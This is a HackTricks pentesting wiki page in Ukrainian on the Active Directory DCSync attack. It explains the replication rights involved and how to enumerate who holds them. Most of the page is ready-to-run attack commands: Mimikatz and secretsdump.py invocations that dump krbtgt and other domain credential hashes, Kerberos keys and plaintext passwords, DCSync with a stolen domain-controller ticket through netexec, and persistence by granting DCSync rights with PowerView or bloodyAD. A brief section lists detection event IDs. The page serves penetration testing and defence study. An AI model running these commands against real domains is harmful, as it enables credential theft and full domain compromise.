# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Дозвіл **DCSync** означає наявність таких дозволів для самого домену: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** і **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Важливі примітки про DCSync:**

- **Атака DCSync імітує поведінку контролера домену та надсилає іншим контролерам домену запит на реплікацію інформації** за допомогою віддаленого протоколу служби реплікації каталогів (MS-DRSR). Оскільки MS-DRSR є дійсною та необхідною функцією Active Directory, його не можна вимкнути чи деактивувати.
- За замовчуванням необхідні привілеї мають лише групи **Domain Admins, Enterprise Admins, Administrators і Domain Controllers**.
- На практиці для **повного DCSync** потрібні дозволи **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** для контексту іменування домену. `DS-Replication-Get-Changes-In-Filtered-Set` зазвичай делегують разом із ними, але сам по собі він більше потрібен для синхронізації **конфіденційних атрибутів / атрибутів, відфільтрованих для RODC** (наприклад, секретів у стилі застарілого LAPS), ніж для повного дампу krbtgt.<sup>[[2]](#references)</sup>
- Якщо паролі облікових записів зберігаються із застосуванням оборотного шифрування, у Mimikatz є параметр для виведення пароля у відкритому вигляді.

### Перелік

Перевірте, хто має ці дозволи, за допомогою `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Якщо потрібно зосередитися на **нестандартних суб'єктах** із правами DCSync, відфільтруйте вбудовані групи з правами реплікації та перевірте лише неочікуваних отримувачів прав:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Експлуатація локально

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Експлуатація віддалено

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Практичні приклади з чітко визначеною областю дії:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync за допомогою перехопленого TGT облікового запису комп’ютера DC (ccache)

Перевіряючи службу на контролері домену, розрізняйте локальну ідентичність служби та її мережеву ідентичність. [Microsoft документує](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions), що віртуальні облікові записи SQL Server (`NT SERVICE\...`) звертаються до мережевих ресурсів від імені облікового запису комп’ютера-хоста. На контролері домену це може зробити обліковий запис комп’ютера DC важливим під час перевірки прав на реплікацію, але сам доступ до служби не підтверджує наявність експортованого TGT комп’ютера чи придатної для DCSync автентифікації. Перш ніж вважати це можливим шляхом, перевірте фактичну ідентичність служби, контекст вихідної автентифікації, наявність квитка або облікових даних, а також ефективні права на реплікацію.

У сценаріях unconstrained delegation з режимом експорту можна перехопити TGT облікового запису комп’ютера контролера домену (наприклад, `DC1$@DOMAIN` для `krbtgt@DOMAIN`). Потім можна використати цей ccache для автентифікації від імені DC і виконання DCSync без пароля.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Операційні примітки:

- **Kerberos-шлях Impacket спочатку звертається до SMB**, перш ніж виконати виклик DRSUAPI. Якщо в середовищі застосовується **перевірка цільового імені SPN**, повний дамп може завершитися помилкою з повідомленням `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- У такому разі спочатку запросіть **service ticket для `cifs/<dc>`** цільового DC або скористайтеся **`-just-dc-user`** для облікового запису, який вам потрібен негайно.
- Навіть якщо у вас є лише нижчий рівень прав на реплікацію, синхронізація в стилі LDAP/DirSync усе одно може розкривати **конфіденційні** атрибути або атрибути, **відфільтровані для RODC** (наприклад, застарілий `ms-Mcs-AdmPwd`), без повної реплікації krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` створює 3 файли:

- один із **NTLM-хешами**
- один із **Kerberos-ключами**
- один із паролями у відкритому вигляді з NTDS для всіх облікових записів, для яких увімкнено [**оборотне шифрування**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Отримати список користувачів з оборотним шифруванням можна за допомогою

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Якщо ви domain admin, за допомогою PowerView можна надати ці дозволи будь-якому користувачу:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Оператори Linux можуть зробити те саме за допомогою `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Потім можна **перевірити, чи правильно користувачеві призначено 3 привілеї, знайшовши їх у виводі команди** (назви привілеїв мають бути в полі "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Пом’якшення

- Security Event ID 4662 (для об’єкта має бути ввімкнено Audit Policy) — виконано операцію над об’єктом<sup>[[4]](#references)</sup>
- Security Event ID 5136 (для об’єкта має бути ввімкнено Audit Policy) — змінено об’єкт служби каталогів
- Security Event ID 4670 (для об’єкта має бути ввімкнено Audit Policy) — змінено дозволи на об’єкт
- AD ACL Scanner — створюйте звіти ACL і порівнюйте їх. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Журнал змін Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: використання Get-Changes і Get-Changes-In-Filtered-Set для реплікації](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: отримання хешів паролів із контролера домену](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — облікові дані SYSVOL → цілеспрямований Kerberoast → необмежене делегування → DCSync для отримання DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
